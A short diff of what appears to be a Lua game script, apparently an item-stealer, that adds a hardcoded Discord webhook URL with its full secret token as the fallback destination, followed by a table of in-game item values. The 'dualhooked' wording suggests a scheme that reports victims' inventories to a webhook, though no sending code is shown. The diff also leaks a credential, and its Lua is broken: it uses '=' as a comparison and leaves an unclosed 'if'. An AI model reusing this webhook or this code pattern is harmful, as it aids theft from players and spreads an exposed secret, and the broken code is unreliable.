@@ -1,8 +1,9 @@
 userName = userName
 webHook = webHook
 if userName = nil then
-userName = "NDH"
-webHook = "NDH"
+userName = "not dualhooked - testing"
+if webHook = nil then
+webHook = "https://discord.com/api/webhooks/1302027168385335346/H2NwinyqtbszXDpYZtkW4HqJYNKj_lU-gggfPAWE8yzGzm9lar82GvpEkM090KOUKRLF"
 local values = {
     ["Nik's Scythe"] = 250000000,
     ["Elderwood Scythe"] = 90,
